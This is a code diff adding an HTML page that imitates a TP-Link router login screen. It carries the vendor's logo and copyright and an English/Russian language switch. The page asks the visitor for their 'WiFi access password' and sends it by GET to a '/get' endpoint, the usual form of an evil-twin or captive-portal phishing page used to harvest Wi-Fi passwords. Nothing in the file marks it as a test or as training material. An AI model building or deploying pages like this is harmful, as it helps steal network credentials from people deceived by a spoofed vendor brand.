@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TP-Link WiFi</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Segoe UI", Tahoma, Arial, sans-serif;
+            background-color: #f1f4f7;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        header {
+            background-color: #fff;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            padding: 0 10%;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            justify-content: space-between;
+        }
+
+        .logo-wrap {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-text {
+            font-size: 26px;
+            font-weight: 600;
+            color: #000;
+            letter-spacing: -1.5px;
+            margin-top: -2px; 
+        }
+
+        .lang-select {
+            font-size: 13px;
+            color: #666;
+        }
+
+        .lang-select span {
+            cursor: pointer;
+            margin: 0 5px;
+        }
+
+        .lang-select span:hover {
+            color: #4acbd6;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-box {
+            background: #fff;
+            width: 100%;
+            max-width: 360px;
+            padding: 45px;
+            border-radius: 4px;
+            box-shadow: 0 4px 25px rgba(0,0,0,0.07);
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #333;
+            margin-bottom: 35px;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+            box-sizing: border-box;
+            transition: border-color 0.2s;
+            margin-bottom: 25px;
+        }
+
+        input[type="password"]:focus {
+            border-color: #4acbd6;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4acbd6;
+            border: none;
+            color: #fff;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: 0.2s;
+        }
+
+        button:hover {
+            background-color: #3cb4be;
+        }
+
+        .note {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #bbb;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo-wrap">
+        <svg width="35" height="35" viewBox="0 0 160 160" xmlns="http://www.w3.org/2000/svg">
+            <path d="m0 111.36c0 4.1599 3.4759 8.3198 8.2158 8.3198h31.615v32.003c0 4.1599 3.4759 8.3198 8.2158 8.3198h27.031v-76.002h-75.078zm100.21-111.36c-33.035 0-59.427 26.559-59.427 59.355v12.644h33.187v-12.644c0-14.236 11.54-25.755 26.239-25.755 14.54 0 24.659 10.236 24.659 25.435 0 15.044-10.908 26.083-25.455 26.083h-12.484v33.591h12.484c32.411 0 58.651-26.711 58.651-59.679 0-34.231-24.499-59.031-57.855-59.031" fill="#4acbd6"/>
+        </svg>
+        <div class="logo-text">tp-link</div>
+    </div>
+    <div class="lang-select">
+        <span onclick="changeLang('en')">English</span> | <span onclick="changeLang('ru')">Русский</span>
+    </div>
+</header>
+
+<div class="main-container">
+    <div class="login-box">
+        <h2 id="title">Log In</h2>
+        
+        <form action="/get" method="GET">
+            <input type="password" name="password" id="pass-field" placeholder="Password" required>
+            <button type="submit" id="btn-text">LOG IN</button>
+        </form>
+
+        <div class="note" id="note-text">
+            Please enter your WiFi access password.
+        </div>
+    </div>
+</div>
+
+<footer>
+    Copyright &copy; 2026 TP-Link Corporation Limited. All rights reserved.
+</footer>
+
+<script>
+    const translations = {
+        en: {
+            title: "Log In",
+            placeholder: "Password",
+            btn: "LOG IN",
+            note: "Please enter your WiFi access password."
+        },
+        ru: {
+            title: "Вход",
+            placeholder: "Пароль",
+            btn: "ВОЙТИ",
+            note: "Пожалуйста, введите пароль доступа к WiFi."
+        }
+    };
+
+    function changeLang(lang) {
+        document.getElementById('title').innerText = translations[lang].title;
+        document.getElementById('pass-field').placeholder = translations[lang].placeholder;
+        document.getElementById('btn-text').innerText = translations[lang].btn;
+        document.getElementById('note-text').innerText = translations[lang].note;
+    }
+</script>
+
+</body>
+</html>
